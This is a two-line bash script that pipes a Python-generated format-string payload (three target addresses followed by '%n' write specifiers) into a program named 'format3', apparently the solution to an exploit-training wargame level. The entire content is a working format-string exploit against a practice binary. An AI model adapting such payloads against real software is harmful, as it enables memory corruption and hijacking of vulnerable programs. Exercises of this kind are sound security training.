#!/bin/bash

python -c "print '\xf4\x96\x04\x08\xf5\x96\x04\x08\xf7\x96\x04\x08%56c%12\$n%529c%13\$n%172c%14\$n'" | ./format3
